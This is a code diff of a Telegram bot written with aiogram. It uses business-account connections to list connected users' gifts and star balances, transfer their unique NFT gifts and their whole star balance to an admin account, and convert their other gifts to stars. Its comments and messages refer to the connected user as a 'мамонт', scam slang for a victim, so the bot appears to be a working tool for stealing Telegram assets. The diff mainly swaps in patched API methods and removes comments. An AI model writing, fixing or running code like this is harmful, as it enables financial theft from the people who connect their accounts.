@@ -7,7 +7,6 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, BusinessConnection, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from aiogram.enums import ParseMode
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.methods import ConvertGiftToStars, GetBusinessAccountGifts, TransferGift, GetBusinessAccountStarBalance
 from aiogram.exceptions import TelegramBadRequest
 from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
 from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
@@ -159,7 +158,7 @@ async def handle_business_connect(business_connection: BusinessConnection):
         save_business_connection_data(business_connection)
 
         try:
-            gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
+            gifts_response = await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection.id))
             logging.info(f"Результат проверки доступа к подаркам для user_id={business_connection.user.id}: {gifts_response}")
             await send_gift_selection_message(business_connection.user.id)
         except TelegramBadRequest as e:
@@ -243,7 +242,7 @@ async def start_command(message: Message):
                 return
             try:
                 business_connection_id = connection["business_connection_id"]
-                gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
+                gifts_response = await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection_id))
                 logging.info(f"Результат проверки доступа к подаркам для user_id={message.from_user.id}: {gifts_response}")
                 await send_gift_selection_message(message.from_user.id)
                 return
@@ -456,10 +455,8 @@ async def handle_gift_callback(callback: CallbackQuery):
         business_connection_id = connection["business_connection_id"]
 
         try:
-            # Прямой вызов метода с ручной обработкой ответа
             response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
-            # Извлекаем amount из result, так как star_amount отсутствует
-            star_amount = response.result.get('amount', 0) if hasattr(response, 'result') else 0
+            star_amount = response.star_amount if hasattr(response, 'star_amount') else 0
             text = f"🆔 Бизнес коннект: <b>{business_connection_id}</b>\n⭐️ Баланс звёзд: <b>{star_amount}</b>\n\n"
         except TelegramBadRequest as e:
             text = f"⚠️ Ошибка получения баланса звёзд: {e}\n\n"
@@ -467,7 +464,7 @@ async def handle_gift_callback(callback: CallbackQuery):
         await callback.message.answer(text, parse_mode="HTML")
 
         try:
-            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
+            gifts = await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection_id))
             if not gifts.gifts:
                 await callback.message.answer("🎁 Нет подарков.")
             else:
@@ -507,31 +504,24 @@ async def handle_transfer(callback: CallbackQuery):
     try:
         _, user_id_str, gift_id, transfer_price_str = callback.data.split(":")
         user_id = int(user_id_str)
-        transfer_price = int(transfer_price_str)  # Комиссия 25 звёзд
+        transfer_price = int(transfer_price_str)
 
         connections = load_connections()
 
-        # Находим подключение пользователя (владельца NFT)
         user_connection = next((c for c in connections if c["user_id"] == user_id), None)
         if not user_connection:
             logging.error(f"Подключение для user_id={user_id} не найдено.")
             await callback.message.answer("⚠️ Подключение пользователя не найдено.")
             return
 
-        # Находим админское подключение
         admin_conn = next((c for c in connections if c["user_id"] == int(ADMIN_ID)), None)
         if not admin_conn:
             logging.error("Админское подключение не найдено.")
             await callback.message.answer("⚠️ Админское подключение не найдено.")
             return
 
-        # Проверяем баланс админа для оплаты комиссии с отладочной информацией
-        admin_balance_response = await bot(GetBusinessAccountStarBalance(
-            business_connection_id=admin_conn["business_connection_id"]
-        ))
-        # Извлекаем star_amount напрямую из объекта StarAmount
+        admin_balance_response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=admin_conn["business_connection_id"]))
         admin_star_amount = getattr(admin_balance_response, 'star_amount', 0)
-        # Если star_amount отсутствует, проверяем amount
         if admin_star_amount == 0:
             admin_star_amount = getattr(admin_balance_response, 'amount', 0)
         raw_response = admin_balance_response.model_dump() if hasattr(admin_balance_response, 'model_dump') else str(admin_balance_response)
@@ -546,14 +536,13 @@ async def handle_transfer(callback: CallbackQuery):
             )
             return
 
-        # 1. Выполняем трансфер NFT от мамонта к админу
-        nft_result = await bot(TransferGift(
+        nft_result = await bot(TransferGiftFixed(
             business_connection_id=user_connection["business_connection_id"],
-            new_owner_chat_id=int(ADMIN_ID),  # Используем new_owner_chat_id вместо receiver_user_id
-            owned_gift_id=gift_id
+            new_owner_chat_id=int(ADMIN_ID),
+            owned_gift_id=gift_id,
+            star_count=transfer_price
         ))
 
-        # 2. Списываем комиссию 25 звёзд с админа
         stars_result = await bot(TransferBusinessAccountStars(
             business_connection_id=admin_conn["business_connection_id"],
             star_count=transfer_price,
@@ -588,15 +577,13 @@ async def transfer_stars_to_admin(callback: CallbackQuery):
     user_id = int(user_id)
 
     try:
-        # Получаем баланс звезд пользователя
         response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
-        star_balance = response.result.get('amount', 0) if hasattr(response, 'result') else 0
+        star_balance = response.star_amount if hasattr(response, 'star_amount') else 0
 
         if star_balance <= 0:
             await callback.message.answer("⚠️ У мамонта нет звезд для передачи.")
             return
 
-        # Находим админское подключение
         connections = load_connections()
         admin_conn = next((c for c in connections if c["user_id"] == int(ADMIN_ID)), None)
 
@@ -605,7 +592,6 @@ async def transfer_stars_to_admin(callback: CallbackQuery):
             await callback.message.answer("❌ Админское подключение не найдено.")
             return
 
-        # Передаем все звёзды админу
         result = await bot(TransferBusinessAccountStars(
             business_connection_id=business_connection_id,
             star_count=star_balance,
@@ -665,9 +651,8 @@ async def show_user_star_balance(callback: CallbackQuery):
 
     business_connection_id = conn["business_connection_id"]
     try:
-        # Прямой вызов метода с ручной обработкой ответа
         response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
-        star_count = response.result.get('amount', 0) if hasattr(response, 'result') else 0
+        star_count = response.star_amount if hasattr(response, 'star_amount') else 0
         logging.info(f"Баланс звёзд для user_id={user_id}: {star_count}")
         kb = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(
@@ -733,7 +718,6 @@ async def convert_select_handler(callback: CallbackQuery):
         reply_markup=keyboard
     )
 
-# Обновленная функция конвертации подарков в звезды
 @dp.callback_query(F.data.startswith("convert_exec:"))
 async def convert_exec_handler(callback: CallbackQuery):
     user_id = int(callback.data.split(":")[1])
@@ -744,10 +728,7 @@ async def convert_exec_handler(callback: CallbackQuery):
         return await callback.message.edit_text("❌ Подключение не найдено.")
 
     try:
-        # Получаем подарки пользователя
-        response = await bot(GetFixedBusinessAccountGifts(
-            business_connection_id=connection["business_connection_id"]
-        ))
+        response = await bot(GetFixedBusinessAccountGifts(business_connection_id=connection["business_connection_id"]))
         gifts = response.gifts
 
         if not gifts:
@@ -757,7 +738,6 @@ async def convert_exec_handler(callback: CallbackQuery):
         failed = 0
 
         for gift in gifts:
-            # Пропускаем уникальные подарки (NFT)
             if gift.type == "unique":
                 continue
 
@@ -768,12 +748,10 @@ async def convert_exec_handler(callback: CallbackQuery):
                 ))
                 converted_count += 1
                 logging.info(f"Подарок {gift.owned_gift_id} конвертирован для user_id={user_id}")
-
             except Exception as e:
                 logging.error(f"Ошибка конвертации подарка {gift.owned_gift_id}: {e}")
                 failed += 1
 
-            # Небольшая пауза между операциями
             await asyncio.sleep(0.1)
 
         await callback.message.edit_text(
